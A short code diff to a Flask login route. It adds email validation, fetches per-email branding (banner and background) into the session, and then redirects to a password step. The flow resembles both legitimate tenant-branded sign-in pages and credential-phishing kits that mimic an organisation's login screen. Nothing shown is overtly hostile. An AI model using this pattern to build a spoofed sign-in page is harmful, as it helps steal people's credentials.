@@ -907,6 +907,15 @@ def index():
         if request.method == 'POST':
             email = request.form.get('email')
             if email:
+                # Validate email and get branding details before redirecting
+                if not is_valid_email(email):
+                    return render_template("index.html", error="Invalid email address.")
+                
+                detail_result = get_detail_email(email)
+                if detail_result.get('status') == 'success':
+                    session['banner'] = detail_result.get('banner')
+                    session['background'] = detail_result.get('background')
+                
                 return redirect(url_for('password', email=email))
 
         # Skip for static files
